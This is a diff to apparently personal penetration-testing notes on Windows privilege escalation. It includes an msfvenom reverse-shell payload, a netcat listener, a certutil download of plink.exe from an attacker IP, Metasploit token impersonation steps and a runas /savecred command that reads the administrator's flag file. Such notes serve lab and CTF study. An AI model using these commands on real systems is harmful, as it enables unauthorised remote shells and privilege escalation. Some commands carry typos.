@@ -81,7 +81,7 @@
 
 ##### manual exploit using msfvenom
 * `msfvenom -p windows/shell_reverse_tcp lhost=<attacker machine's IP> lport=<listening port> -f aspx > manual.aspx`
-* don't forget to listen on `nc -lnvp <port>
+* don't forget to listen on `nc -lnvp <port>`
 
 ### Escalation path: password and port forwarding
 
@@ -90,7 +90,38 @@
 
 * on kali machine `apt install ssh`
 * quick mod on ssh itself: `nano /etc/ssh/sshd_config` **#PermitRootLogin** uncomment it and change it's permission to **yes**
-* 
+
+#### Using plink.exe
+
+* **Bring file over to target machine in Windows:** `certutil --urlcache -f http://<`attack machine's IP>/plink.exe
+* find a folder with wright priv. /tmp is good
+* use plink for port forwarding 
+
+#### Windows subsystem for Linux
+
+* where /R c:\windows bash.exe
+
+### Impersonation and Potato Attack
+
+#### In Metasploit meterpreter shell
+
+* `getuid`
+* `load_incognito`
+* `list_tokens -u`
+* `impersonate token <domain controller's name>\\<username>`  
+* `shell`
+
+#### Checking results
+
+* in Windows: `whoami /priv`
+* in metasploit `getprivs`
+
+* alternatively we can use metasploit exploit suggester as well: `run post/multi/recon/exploit_suggester` 
+
+### Escalation path: runas
+
+* `cmdkey /list`
+* `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe \c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt`
 
 
 
